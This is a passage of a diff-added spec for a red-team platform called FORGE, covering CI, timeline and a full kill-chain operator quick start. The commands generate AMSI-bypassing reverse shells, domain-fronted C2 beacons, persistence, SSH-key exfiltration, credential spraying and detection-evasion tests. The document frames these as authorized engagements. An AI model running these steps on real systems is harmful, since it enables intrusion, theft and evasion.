+| Passing Firebase API key via `--api-key` CLI argument directly | Key visible in `ps aux`, `/proc/$PID/cmdline`, shell history | Module 4-E sources the key from `key_scanner_findings` automatically. Never pass raw keys on the command line. |
+| Storing Firebase API key from APK extraction in plaintext in `cloud_assets` | Engagement DB compromise exposes live API keys | Age-encrypt at extraction time. `cloud_assets.identifier` stores project ID only; encrypted key is in a separate field. |
+| Running Supabase write probes without `--dry-run` confirmation | `POST /rest/v1/<table>` creates a traceable record in the target's live database | `questionary.confirm()` per table before write. `--dry-run` suppresses all writes. Document any write probes in the engagement log. |
+| Passing Supabase `--anon-key` as a raw CLI argument | JWT visible in shell history and process list | Use `--anon-key-file <path>` or `SUPABASE_ANON_KEY` env var. Never pass raw JWTs via CLI flags. |
+| Using a discovered Supabase anon key without verifying project URL is in scope | May probe a Supabase project outside engagement scope | Scope gate enforced at Module 4-G entry. Verify `<project-ref>.supabase.co` is in `engagement.scope`. |
+| Storing full HTTP response body in `vulnerability_findings.evidence` | PII retention risk; oversized engagement DB | Evidence is always truncated to 512 characters. Do not modify the truncation constant. |
+
+---
+
+### 13.5 Module 2-J Key Scanner Anti-Patterns *(New — v7.2)*
+
+| Anti-Pattern | Risk | Correct Approach |
+|---|---|---|
+| Using a personal or primary operator GitHub account for Code Search queries | Queries are logged by GitHub; attributable to the operator's real identity and organisation | Use a throwaway burn account with no linkage to real infrastructure or prior engagements. |
+| Running API key validation without `--validation-proxy` | Validator calls (`AWS STS`, `Stripe /v1/account`) originate from operator IP; directly attributable | CLI exits code 1 if `--validation-proxy` is not set and `--no-validate` not explicitly passed. No silent bypass. |
+| Logging raw API key values to `audit_log` or stdout | Key values exposed in unencrypted audit trail | `audit_log()` receives only `key_id` and `validation_state`. Raw key values are age-encrypted at insert. |
+| Retaining ACTIVE third-party keys beyond the engagement window | Ongoing unauthorised access to third-party services; legal liability | ACTIVE key findings trigger immediate disclosure to client. Keys must not be stored after engagement close. |
+| Querying GitHub Code Search with target-specific strings (company name, domain) | Highly attributable; GitHub logs query content against the token | Prefer generic regex-based patterns; filter client-side against scope. Document query strings in engagement brief.
+
+---
+
+## 14. CI PIPELINE (v7.2 — Updated)
+
+The CI pipeline enforces quality gates across all phases. All jobs must pass before merge to `main`.
+
+```yaml
+# .github/workflows/forge-ci.yml (representative structure)
+
+jobs:
+  lint:
+    name: Lint & Type Check
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/checkout@v4
+      - run: pip install ruff mypy --break-system-packages
+      - run: ruff check forge/
+      - run: mypy forge/ --strict
+
+  test-filename-opsec:
+    name: Filesystem Signature Check
+    runs-on: ubuntu-24.04
+    steps:
+      - uses: actions/checkout@v4
+      - run: python scripts/check_filenames.py   # fails on canonical names in obfuscated dirs
+
+  test-phase0:
+    name: Phase 0 — Knowledge Base ETL
+    runs-on: ubuntu-24.04
+    steps:
+      - run: pytest tests/phase0/ -v --cov=forge/phase0 --cov-fail-under=75
+
+  test-phase1:
+    name: Phase 1 — Reconnaissance
+    runs-on: ubuntu-24.04
+    steps:
+      - run: pytest tests/phase1/ -v --vcr-record=none --cov=forge/phase1 --cov-fail-under=75
+
+  test-phase2-core:
+    name: Phase 2 — OSINT Core (Modules 2-A through 2-E)
+    runs-on: ubuntu-24.04
+    steps:
+      - run: pytest tests/phase2/test_breach_db.py tests/phase2/test_credential_validator.py
+               tests/phase2/test_dehashed.py tests/phase2/test_xposedornot.py
+               tests/phase2/test_theharvester.py
+               -v --vcr-record=none --cov=forge/utils/intel --cov-fail-under=75
+
+  test-phase2-extended:
+    name: Phase 2 — OSINT Extended (Modules 2-F through 2-J)
+    runs-on: ubuntu-24.04
+    steps:
+      - run: pytest tests/phase2/test_reputation_lookup.py    # Module 2-F (Emailrep.io)
+               tests/phase2/test_social_scraper.py            # Module 2-G (Epieos)
+               tests/phase2/test_handle_finder.py             # Module 2-H (Username Enum)
+               tests/phase2/test_github_osint.py              # Module 2-I (GitHub OSINT)
+               tests/phase2/test_secret_finder.py             # Module 2-J (Key Scanner)
+               -v --vcr-record=none --cov=forge/utils/intel --cov-fail-under=75
+    # Evasion assertion: --no-validate flag makes zero outbound calls
+      - run: pytest tests/phase2/test_secret_finder.py::test_no_validate_zero_network_calls -v
+
+  test-phase3:
+    name: Phase 3 — Evasion Engine
+    runs-on: ubuntu-24.04
+    steps:
+      - run: pytest tests/phase3/ -v --cov=forge/phase3 --cov-fail-under=75
+
+  test-phase4-correlation:
+    name: Phase 4 — Exploit Correlation (Modules 4-A through 4-C)
+    runs-on: ubuntu-24.04
+    steps:
+      - run: pytest tests/phase4/test_correlator.py
+               tests/phase4/test_hash_taxonomy.py
+               tests/phase4/test_hash_credential_bridge.py
+               tests/phase4/test_hash_correlation_integration.py
+               -v --cov=forge/phase4 --cov-fail-under=75
+
+  test-phase4-cloud:
+    name: Phase 4 — Vulnerability Discovery (Modules 4-D through 4-G)
+    runs-on: ubuntu-24.04
+    container:
+      image: ghcr.io/redhuntlabs/agneyastra:1.0.0   # provides agneyastra binary for 4-E tests
+    steps:
+      - run: pytest tests/phase4/test_param_probe.py         # Module 4-D (IDOR Scanner)
+               tests/phase4/test_cloud_audit.py              # Module 4-E (Firebase Agneyastra)
+               tests/phase4/test_mobile_config_parse.py      # Module 4-F (Firebase Extract)
+               tests/phase4/test_api_policy_check.py         # Module 4-G (Supabase Scanner)
+               -v --vcr-record=none --cov=forge/phase4 --cov-fail-under=75
+    # Scope gate assertion: out-of-scope URL must raise ScopeViolationError in all modules
+      - run: pytest tests/phase4/test_scope_gate_phase4.py -v
+    # Evidence truncation assertion: no vulnerability_findings.evidence > 512 chars
+      - run: pytest tests/phase4/test_evidence_truncation.py -v
+
+  test-phase5:
+    name: Phase 5 — Post-Exploitation
+    runs-on: ubuntu-24.04
+    steps:
+      - run: pytest tests/phase5/ -v --cov=forge/utils/post --cov-fail-under=75
+    # Evasion assertion tests: verify obfuscated output does not match known static signatures
+      - run: pytest tests/phase5/test_evasion_assertions.py -v
+
+  test-phase6:
+    name: Phase 6 — LLM Reporting
+    runs-on: ubuntu-24.04
+    steps:
+      - run: pytest tests/phase6/ -v --cov=forge/phase6 --cov-fail-under=75
+
+  test-integration:
+    name: Full Kill-Chain Integration
+    runs-on: ubuntu-24.04
+    needs: [test-phase2-core, test-phase2-extended, test-phase3, test-phase4-correlation, test-phase4-cloud, test-phase5, test-phase6, test-opsec-invariants]
+    steps:
+      - run: pytest tests/integration/test_kill_chain.py -v
+
+  test-opsec-invariants:
+    name: OPSEC Invariant Tests
+    runs-on: ubuntu-24.04
+    needs: [test-phase2-extended, test-phase3, test-phase4-cloud, test-phase5]
+    steps:
+      # Assert: no plaintext passwords in audit_log
+      # Assert: scope_gate raises ScopeViolationError on out-of-scope targets
+      # Assert: all Phase 5 output agents contain REPLACE_BEFORE_DEPLOY sentinel
+      # Assert: beacon intervals use Gaussian distribution (K-S test against uniform)
+      # Assert: no raw API key values (32+ char hex/base64) in audit_log (Module 2-J)
+      # Assert: Agneyastra output file deleted post-parse (Module 4-E)
+      # Assert: vulnerability_findings.evidence length <= 512 chars (Modules 4-D, 4-G)
+      - run: pytest tests/opsec/ -v
+```
+
+**VCR cassette policy:** All external API calls in Phase 2 tests must be recorded to VCR cassettes during development and replayed in CI. No live network access is permitted in CI. Cassette files are committed to `tests/cassettes/` and reviewed in PR.
+
+**Evasion assertion tests** (`test_evasion_assertions.py`): For each obfuscated payload template, assert that the output does not match signatures in `tests/fixtures/yara_rules/` and `tests/fixtures/sigma_rules/`. These tests run against a pinned snapshot of public YARA/Sigma repositories.
+
+**Phase 4 cloud test VCR cassettes:** Module 4-D tests use a mock HTTP server (`pytest-httpserver`) rather than VCR cassettes, as BFS crawls are stateful. Modules 4-E, 4-F, 4-G use fixture JSON files and VCR cassettes for PostgREST/OpenAPI responses.
+
+---
+
+## 17. IMPLEMENTATION TIMELINE (v7.2 — 30–35 Weeks)
+
+The addition of Module 2-J (Phase 2) and Modules 4-D through 4-G (Phase 4) extends the overall timeline by approximately 6–7 calendar weeks relative to v7.0, assuming two parallel engineering tracks.
+
+| Phase | Weeks | Deliverables | Notes |
+|-------|-------|-------------|-------|
+| **0 — Knowledge Base** | 1–4 | ETL pipeline, FTS5, scoring, `exploit_cache.db`, `nvd_cache.db`, `schtasks_legit_names` table | Prerequisite for all other phases |
+| **1 — Reconnaissance** | 5–9 | Engagement init wizard, `LongRunningTask`, subdomain enum, port scan, email harvest, resume detection | `scope_gate.py` built in Week 5 |
+| **2 — OSINT Intel (Core)** | 9–13 | Modules 2-A, 2-B, 2-C, 2-D, 2-E; extended credentials schema | Parallel to Phase 3 |
+| **2 — OSINT Intel (Extended v7.0)** | 13–15 | Modules 2-F (Emailrep.io), 2-G (Epieos), 2-H (Username Enum) | 2-week extension from v7.0 |
+| **2 — OSINT Intel (Extended v7.2)** | **15–17** | **Module 2-I (GitHub OSINT), Module 2-J (Key Scanner)** | **New in v7.2; burn account + proxy OPSEC required** |
+| **3 — Evasion Engine** | 9–11 | 6-criterion obfuscation matrix, encoding chain, HTML smuggling, LOTS selector | Parallel to Phase 2 |
+| **4 — Exploit Correlation (Core)** | 11–13 | Version parser, `exploit_correlator.py`, CVSS enrichment, Module 4-C hash-aware correlator | Parallel to Phase 2 |
+| **4 — Vulnerability Discovery (v7.2)** | **17–21** | **Modules 4-D (IDOR), 4-E (Firebase Agneyastra), 4-F (Firebase Extract), 4-G (Supabase)** | **New in v7.2; agneyastra Docker image required in CI** |
+| **5a — Shells + C2** | 21–25 | Modules 5-F, 5-G: TLS shells, AMSI bypass, domain fronting, Gaussian jitter, sleep masking, DoH DNS | Shifted 4 weeks right due to Phase 2 + Phase 4 extensions |
+| **5b — Exfiltration** | 25–27 | Module 5-H: 6 collector types, throttle, time window, stagger, C2 channel reuse | |
+| **5c — Persistence** | 27–29 | Module 5-I: 13 techniques, LOLBin names from KB, timestamp mirroring, COM hijack | |
+| **5d — Lateral Movement** | 28–30 | Module 5-J: SMB/WMI/WinRM/SSH/DCOM, Kerberos PTT, time window enforcement | |
+| **6 — LLM Reporting** | 29–31 | `ReportGenerator`, validator, Phase 2 (all 10 modules) + Phase 4 vuln findings + Phase 5 data integrated | |
+| **OPSEC Hardening** | 30–32 | `crypto.py`, `cleanup.py`, audit log, secrets store, scope gate audit; **v7.2:** `burn_account_manager.py` (Module 2-J rotation), Agneyastra cleanup hook validation (Module 4-E), evidence truncation enforcement (Modules 4-D/4-G) | |
+| **Testing** | 31–33 | ≥75% coverage, VCR cassettes, Docker mocks, evasion assertion tests, `test-phase4-cloud` CI job; **v7.2:** `test-opsec-invariants` (gates `test-integration`), `test_no_validate_zero_network_calls` (Module 2-J), `test_evidence_truncation` (Modules 4-D/4-G) | |
+| **Documentation** | 32–35 | Operator handbook, TTX scenarios, blue team evasion runbook, OPSEC quick-reference card | |
+
+> **Timeline note:** Weeks 9–11 (Phase 3) and Weeks 11–13 (Phase 4 core) run in parallel with the Phase 2 core track. Phase 2 extended (Weeks 13–17) and Phase 4 vulnerability discovery (Weeks 17–21) occupy a sequential track. Phase 5 cannot begin until Phase 2-J and Phase 4-G are complete, as the Phase 6 report context builder consumes outputs from all these modules.
+
+---
+
+### 17.1 Phase 2 + Phase 4 + Phase 5 Effort Summary (v7.2 — Full)
+
+| Module | Focus | Effort | Priority | New in |
+|--------|-------|--------|----------|--------|
+| 2-A — Local Breach DB | Offline credential intelligence, SQLite, format parsers | 11 days | High | v6.0 |
+| 2-B — Credential Validation | Live credential spray, asyncio, 5 auth adapters | 30 days | High | v6.0 |
+| 2-C — DeHashed API | Paid breach intelligence, ETag incremental sync | 10 days | Medium | v6.0 |
+| 2-D — XposedOrNot API | Free breach metadata, 1 req/s token bucket | 5 days | Medium | v6.0 |
+| 2-E — theHarvester Wrapper | Subprocess orchestration, JSON parsing, dedup | 9.5 days | Medium | v6.0 |
+| 2-F — Emailrep.io | Reputation lookup, rate limiter, encrypted key store, 24h cache | 3 days | Medium | v7.0 |
+| 2-G — Epieos | Social account linkage, proxy isolation, session-per-target | 4 days | Medium | v7.0 |
+| 2-H — Username Enumeration | Multi-site probing, site signatures JSON, proxy rotation, false-positive tagging | 5 days | Medium | v7.0 |
+| **2-I — GitHub OSINT** | **GitHub Code Search, org recon, secret pattern scan** | **~12 days** | **Medium** | **v7.1** |
+| **2-J — Key Scanner** | **API key regex detection, ABC validators (AWS/Stripe/GitHub), burn account, validation proxy** | **~20 days** | **High** | **v7.2** |
+| 4-C — Hash-Aware Correlator | Hash taxonomy, HashCredentialBridge, PTH/NTLM/Kerberoast scoring | 10 days | High | v7.1 |
+| **4-D — IDOR Scanner** | **BFS crawler, ID param substitution, JSON severity, scope gate per fetch** | **~12.5 days** | **High** | **v7.2** |
+| **4-E — Firebase Agneyastra** | **agneyastra subprocess wrapper, API key auto-inject, cleanup file, severity mapping** | **~8.5 days** | **High** | **v7.2** |
+| **4-F — Firebase Extract** | **APK/IPA passive extraction, plistlib, RTDB regex, age-encrypt API keys** | **~6.5 days** | **Medium** | **v7.2** |
+| **4-G — Supabase RLS Scanner** | **PostgREST schema discovery, anon read/write probes, sensitive column detection** | **~11 days** | **High** | **v7.2** |
+| 5-F — Reverse Shell Generator | TLS shells, AMSI bypass, process injection, Jinja2 templates | 19 days | High | v6.0 |
+| 5-G — C2 Beacon Generator | Domain fronting, Gaussian jitter, sleep masking, DoH DNS, realistic headers | 36 days | High | v6.0 |
+| 5-H — Exfiltration Collectors | 6 collector types, throttle, time window, stagger, channel reuse | 31 days | Medium | v6.0 |
+| 5-I — Persistence Templates | 13 techniques, KB-sourced LOLBin names, timestamp mirroring, COM hijack | 26 days | Medium | v6.0 |
+| 5-J — Lateral Movement | Kerberos PTT, DCOM, SMB/WMI/WinRM/SSH, named-pipe evasion, time window | 34 days | High | v6.0 |
+| `scope_gate.py` + shared infra | Scope enforcement, `ScopeViolationError`, pre-flight checks | 5 days | Critical (P0) | v6.0 |
+| **Phase 2 v7.2 Subtotal** | **Modules 2-I + 2-J (new in v7.1–7.2)** | **~32 days** | | |
+| **Phase 2 Total** | **All 10 OSINT modules (2-A through 2-J)** | **~109.5 days** | | |
+| **Phase 4 v7.2 Subtotal** | **Modules 4-D + 4-E + 4-F + 4-G (new in v7.2)** | **~38.5 days** | | |
+| **Phase 4 Total** | **All active Phase 4 modules (4-A through 4-G)** | **~88.5 days** | | |
+| **TOTAL NEW (v7.2 delta from v7.0)** | **2-J + 4-D + 4-E + 4-F + 4-G** | **~58.5 days** | | |
+| **CUMULATIVE PROJECT TOTAL** | **All modules listed** | **~307 days** | | |
+
+> **v7.2 delta from v7.0:** Modules 2-J, 4-D, 4-E, 4-F, and 4-G add approximately 58.5 engineering days across two parallel tracks. At standard throughput (~10 productive days/calendar week across two engineers), this represents **6–7 calendar weeks** of additional capacity. Overall project timeline extends from 24–28 weeks (v7.0) to **30–35 weeks (v7.2)**.
+
+---
+
+## 18. QUICK START — FULL KILL-CHAIN WORKFLOW (v7.2)
+
+This is the canonical operator reference for running a complete FORGE engagement. Commands are shown in execution order. Read §12 before executing any Phase 2 or Phase 5 command.
+
+```bash
+# ═══════════════════════════════════════════════════════════════════════════
+# PRE-ENGAGEMENT — Run from operator machine, offline/VPN only
+# ═══════════════════════════════════════════════════════════════════════════
+
+# Sync the Phase 0 knowledge base (LOLBAS, GTFOBins, NVD, Exploit-DB)
+# Run during a pre-engagement sync window, not during the engagement itself
+forge update-kb
+
+# Verify KB integrity
+forge kb --verify
+
+# ═══════════════════════════════════════════════════════════════════════════
+# ENGAGEMENT INITIALISATION
+# ═══════════════════════════════════════════════════════════════════════════
+
+forge init \
+  --target 10.0.0.0/24 \
+  --name "Q1-2026 Red Team" \
+  --operator analyst01 \
+  --output /mnt/engagements/acme-001.db
+
+# Confirm scope is correctly loaded before proceeding
+forge scope show --engagement acme-001
+
+# ═══════════════════════════════════════════════════════════════════════════
+# PHASE 1: RECONNAISSANCE
+# ═══════════════════════════════════════════════════════════════════════════
+
+forge recon \
+  --engagement acme-001 \
+  --modules subdomain,portscan,email_harvest \
+  --rate 10 \
+  --resolver 1.1.1.1
+
+# Review recon results before proceeding to OSINT
+forge recon --engagement acme-001 --report
+
+# ═══════════════════════════════════════════════════════════════════════════
+# PHASE 2: OSINT & CREDENTIAL INTELLIGENCE
+# ═══════════════════════════════════════════════════════════════════════════
+
+# ── Core OSINT Modules (2-A through 2-E) ─────────────────────────────────
+
+# Module 2-D: XposedOrNot — free breach metadata, no key required
+forge osint xposed --engagement acme-001
+
+# Module 2-A: Local breach DB — offline, no external queries
+forge osint breach \
+  --engagement acme-001 \
+  --db /mnt/breach/collection1.db \
+  --format email:pass
+
+# Module 2-C: DeHashed — paid breach intelligence (ETag incremental sync)
+forge osint dehashed --engagement acme-001
+
+# Module 2-E: theHarvester — social OSINT, email harvest
+forge osint harvest \
+  --engagement acme-001 \
+  --domain example.com \
+  --sources google,bing,linkedin
+
+# ── Extended OSINT Modules (2-F through 2-H, New in v7.0) ─────────────────
+
+# Module 2-F: Emailrep.io — reputation enrichment for discovered addresses
+# Rate: 1 req/s (free tier); results cached 24h in engagement DB
+forge osint emailrep --engagement acme-001
+
+# Module 2-G: Epieos — social account linkage for confirmed in-scope emails
+# Use --proxy for sensitive investigations; see §12.3.7
+forge osint epieos \
+  --engagement acme-001 \
+  --emails found@example.com,admin@example.com \
+  --proxy socks5://127.0.0.1:9050          # optional: route through Tor
+
+# Module 2-H: Username enumeration — derive usernames from harvested names
+# --dry-run previews target list without making any network requests
+forge osint username \
+  --engagement acme-001 \
+  --username johndoe \
+  --dry-run                                # always preview first
+
+forge osint username \
+  --engagement acme-001 \
+  --username johndoe \
+  --rotate-proxy /mnt/proxies/residential.txt   # use proxy rotation for stealth
+
+# Module 2-J: Key Scanner — GitHub code search for exposed API keys
+# OPSEC: GITHUB_TOKEN must be a throwaway burn account (see §12.3.9)
+# --validation-proxy required; CLI exits code 1 if omitted without --no-validate
+forge osint keyscan \
+  --engagement acme-001 \
+  --dry-run                                      # preview patterns before live search
+
+GITHUB_TOKEN=ghp_burnaccount forge osint keyscan \
+  --engagement acme-001 \
+  --validation-proxy http://127.0.0.1:8080 \
+  --services aws,stripe,github                   # limit to services in scope
+
+# ── Credential Validation (Module 2-B) ───────────────────────────────────
+
+# Step 1: Dry-run — validates configuration, prints targets, no auth attempts
+forge validate-creds \
+  --engagement acme-001 \
+  --services ssh,http,rdp \
+  --delay 5 \
+  --concurrency 3
+
+# Step 2: Live spray — requires explicit confirmation prompt
+# Gaussian jitter applied automatically to --delay value
+forge validate-creds \
+  --engagement acme-001 \
+  --services ssh,http,rdp \
+  --delay 5 \
+  --concurrency 3 \
+  --enrich \                               # attach emailrep/epieos data to results
+  --execute                                # triggers interactive confirmation
+
+# ═══════════════════════════════════════════════════════════════════════════
+# PHASE 3: EVASION & PAYLOAD GENERATION
+# ═══════════════════════════════════════════════════════════════════════════
+
+# Build an obfuscated download cradle for Windows
+# --strip-metadata is enabled by default
+forge build \
+  --engagement acme-001 \
+  --payload download \
+  --os windows \
+  --url https://cdn.example.com/update.exe \
+  --obfuscate \
+  --encode base64,xor
+
+# HTML smuggling delivery
+forge build \
+  --engagement acme-001 \
+  --payload html-smuggle \
+  --os windows \
+  --url https://cdn.example.com/update.exe
+
+# ═══════════════════════════════════════════════════════════════════════════
+# PHASE 4: EXPLOIT CORRELATION & VULNERABILITY DISCOVERY
+# ═══════════════════════════════════════════════════════════════════════════
+
+# ── 4-A/4-B/4-C: Exploit Correlation ────────────────────────────────────
+forge exploits \
+  --engagement acme-001 \
+  --auto-suggest \
+  --min-cvss 7.0
+
+# Show hash-correlated suggestions (Module 4-C)
+forge exploits suggest \
+  --engagement acme-001 \
+  --top 10 \
+  --hash-context
+
+# Crack pending hashes and re-correlate
+forge exploits crack-pending --engagement acme-001 --offline-only
+forge exploits recorrelate   --engagement acme-001
+
+# ── 4-D: IDOR Scanner ───────────────────────────────────────────────────
+# Dry-run first: review discovered ID parameters and probe count
+forge vuln idor \
+  --engagement acme-001 \
+  --target-url https://app.example.com \
+  --dry-run
+
+# Authenticated scan
+forge vuln idor \
+  --engagement acme-001 \
+  --target-url https://app.example.com \
+  --depth 3 \
+  --delay 2.0 \
+  --cookie /mnt/engagements/cookies.txt
+
+# ── 4-F: Firebase Extract — passive, offline, no scope gate needed ───────
+# Run early in the engagement from APK/IPA files obtained from client
+forge cloud firebase-extract \
+  --apk /mnt/samples/com.example.app.apk \
+  --ipa /mnt/samples/ExampleApp.ipa \
+  --engagement acme-001 \
+  --output-json /mnt/engagements/firebase_projects.json
+
+# ── 4-E: Firebase Agneyastra — requires agneyastra >= 1.0.0 on PATH ─────
+# 4-F must run first to populate cloud_assets with project IDs
+# API key auto-injected from key_scanner_findings if Module 2-J found one
+forge cloud firebase \
+  --engagement acme-001 \
+  --project-id my-project \
+  --tests auth,database,firestore,storage \
+  --dry-run                                      # preview planned invocation first
+
+forge cloud firebase \
+  --engagement acme-001 \
+  --project-id my-project \
+  --tests auth,database,firestore,storage \
+  --timeout 600
+
+# ── 4-G: Supabase RLS Scanner ────────────────────────────────────────────
+# --dry-run suppresses all write probes (read-only mode)
+forge cloud supabase \
+  --engagement acme-001 \
+  --project-ref xyzxyzxyz \
+  --anon-key eyJhbGci... \
+  --dry-run                                      # always run read-only first
+
+# Full scan: write probes require per-table questionary.confirm()
+forge cloud supabase \
+  --engagement acme-001 \
+  --project-ref xyzxyzxyz \
+  --anon-key eyJhbGci... \
+  --auth-token eyJhbGci...                       # optional: authenticated differential
+
+# ═══════════════════════════════════════════════════════════════════════════
+# PHASE 5: POST-EXPLOITATION
+# ═══════════════════════════════════════════════════════════════════════════
+
+# ── 5-F: Reverse Shell ───────────────────────────────────────────────────
+# TLS reverse shell on 443, AMSI bypass, obfuscated
+# --dry-run previews generated template without writing to disk
+forge payload reverse-shell \
+  --engagement acme-001 \
+  --lhost 10.0.0.99 \
+  --lport 443 \
+  --type powershell \
+  --obfuscate \
+  --tls \
+  --dry-run                                # remove to generate output file
+
+forge payload reverse-shell \
+  --engagement acme-001 \
+  --lhost 10.0.0.99 \
+  --lport 443 \
+  --type powershell \
+  --obfuscate \
+  --tls \
+  --inject-process explorer               # dynamic PID selection at agent runtime
+
+# ── 5-G: C2 Beacon ───────────────────────────────────────────────────────
+# Domain fronting + Gaussian jitter + sleep masking
+# Operators MUST replace AES key placeholder before deployment
+forge c2 generate \
+  --engagement acme-001 \
+  --agent python \
+  --channel https \
+  --c2 https://cdn-proxy.example.com \
+  --front-domain cdn.legitimate-cloud.com \
+  --interval 300 \
+  --jitter-type gaussian \
+  --jitter-sigma 0.25 \
+  --sleep-mask \
+  --obfuscate \
+  --dry-run                                # preview; remove to write agent
+
+# ── 5-I: Persistence ─────────────────────────────────────────────────────
+# LOLBin-named scheduled task, timestamp mirrored from svchost.exe
+# --dry-run previews generated command without executing or writing
+forge persistence generate \
+  --engagement acme-001 \
+  --target windows \
+  --technique schtask \
+  --obfuscate \
+  --mirror-timestamp-from "C:\Windows\System32\svchost.exe" \
+  --dry-run
+
+forge persistence generate \
+  --engagement acme-001 \
+  --target windows \
+  --technique com-hijack \
+  --clsid auto \                           # auto-select a frequently-called CLSID
+  --obfuscate
+
+# ── 5-H: Exfiltration ────────────────────────────────────────────────────
+# Throttled, business-hours window, 500ms stagger, C2 channel reuse
+forge exfil collect \
+  --engagement acme-001 \
+  --agent-id 1 \
+  --collector ssh_keys \
+  --rate 50k \
+  --window 09:00-17:00 \
+  --stagger 500ms \
+  --channel c2-reuse \
+  --dry-run                                # enumerate targets without collecting
+
+forge exfil collect \
+  --engagement acme-001 \
+  --agent-id 1 \
+  --collector ssh_keys \
+  --rate 50k \
+  --window 09:00-17:00
+
+# ── 5-J: Lateral Movement ────────────────────────────────────────────────
+# Kerberos PTT, DCOM technique, business-hours window
+forge move lateral \
+  --engagement acme-001 \
+  --target 10.0.0.15 \
+  --credential-id 3 \
+  --technique dcom \
+  --command "whoami" \
+  --ticket /tmp/krb5cc_1000 \
+  --window 09:00-17:00 \
+  --cleanup-on-exit \
+  --dry-run                                # validate config without executing
+
+forge move lateral \
+  --engagement acme-001 \
+  --target 10.0.0.15 \
+  --credential-id 3 \
+  --technique dcom \
+  --command "whoami" \
+  --ticket /tmp/krb5cc_1000 \
+  --window 09:00-17:00 \
+  --cleanup-on-exit
+
+# ═══════════════════════════════════════════════════════════════════════════
+# PHASE 6: LLM-ASSISTED REPORTING
+# ═══════════════════════════════════════════════════════════════════════════
+
+# Generate report — integrates Phase 2 (all 10 modules) + Phase 4 vuln findings + Phase 5 findings
+forge report \
+  --engagement acme-001 \
+  --generate \
+  --format markdown,pdf
+
+# ═══════════════════════════════════════════════════════════════════════════
+# POST-ENGAGEMENT CLEANUP
+# ═══════════════════════════════════════════════════════════════════════════
+
+# Verify all agents are terminated before running cleanup
+forge c2 status --engagement acme-001
+
+# Terminate any running agents
+forge c2 terminate --engagement acme-001 --all
+
+# Run full cleanup: removes staging files, persistence artefacts,
+# temp files, and shreds engagement DB on operator machine
+forge clean --engagement acme-001 --verify
+
+# Final: shred the engagement DB itself after archiving the report
+forge archive --engagement acme-001 --output /mnt/archive/acme-001-report.tar.age
+forge clean --engagement acme-001 --shred-db
+```
+
+---
+
+## 19. OPERATOR OPSEC CHECKLIST — PRE/POST ENGAGEMENT
+
+Use this checklist at the start and end of every engagement. Every item must be signed off in the engagement brief.
+
+### Pre-Engagement
+
+- [ ] KB synced and verified (`forge update-kb && forge kb --verify`)
+- [ ] Engagement DB created on encrypted volume
+- [ ] Scope confirmed and loaded into engagement DB
+- [ ] `scope_gate` verified: out-of-scope test returns `ScopeViolationError`
+- [ ] AES keys replaced in all agent templates (no `REPLACE_BEFORE_DEPLOY` strings)
+- [ ] API keys stored in `config/secrets.age` (not environment variables)
+- [ ] Operator machine connected via VPN or out-of-band link
+- [ ] theHarvester and OSINT tool versions pinned and verified
+- [ ] Proxy / Tor configured and tested for Epieos / username enum modules
+- [ ] Engagement breach DB registered with `cleanup.py`
+- [ ] **[v7.2] Module 2-J: Throwaway burn GitHub account provisioned; not linked to any real identity or prior engagement**
+- [ ] **[v7.2] Module 2-J: `--validation-proxy` configured and tested before any keyscan run**
+- [ ] **[v7.2] Module 4-D: Engagement brief confirms active web scanning of target is authorised**
+- [ ] **[v7.2] Module 4-E: `agneyastra` binary verified at `>= 1.0.0` (`agneyastra --version`)**
+- [ ] **[v7.2] Module 4-E: Firebase test scope documented in engagement brief (which tests are authorised)**
+- [ ] **[v7.2] Module 4-F: APK/IPA files sourced via authorised means only**
+- [ ] **[v7.2] Module 4-G: Supabase anon key and project ref confirmed in scope; `--auth-token` is a test account, not a production credential**
+
+### Post-Engagement
+
+- [ ] All C2 agents confirmed terminated (`forge c2 status --engagement <id>`)
+- [ ] All persistence artefacts confirmed removed (`forge clean --engagement <id> --verify`)
+- [ ] Staging directories confirmed empty
+- [ ] `audit_log` exported and archived
+- [ ] Report generated and archived (`forge archive`)
+- [ ] Engagement DB shredded from operator disk (`forge clean --shred-db`)
+- [ ] Breach DB shredded or returned to encrypted archive
+- [ ] Shell history sanitised
+- [ ] VPN / proxy session terminated
+- [ ] Temp files checked: `ls /tmp/ | grep -i forge`
+- [ ] **[v7.2] Module 2-J: Any ACTIVE key findings disclosed to client within engagement SLA**
+- [ ] **[v7.2] Module 2-J: Burn GitHub account decommissioned post-engagement**
+- [ ] **[v7.2] Module 4-E: Agneyastra JSON output file confirmed deleted (`forge clean --verify`)**
+- [ ] **[v7.2] Module 4-G: Supabase write probe records (`__forge_probe__`) confirmed cleaned up by client or operator**
+- [ ] **[v7.2] Modules 4-D/4-G: `vulnerability_findings` table reviewed; any CRITICAL findings in report with client notification log**
+
+---
+
+*END OF CHUNK 8 — v7.2*
+
+*FORGE Toolkit v7.2 — Implementation-Ready*
+*Full-Spectrum Red Team Platform: Knowledge Base → Recon → OSINT Intelligence → Evasion → Exploit Correlation → Post-Exploitation → Reporting*
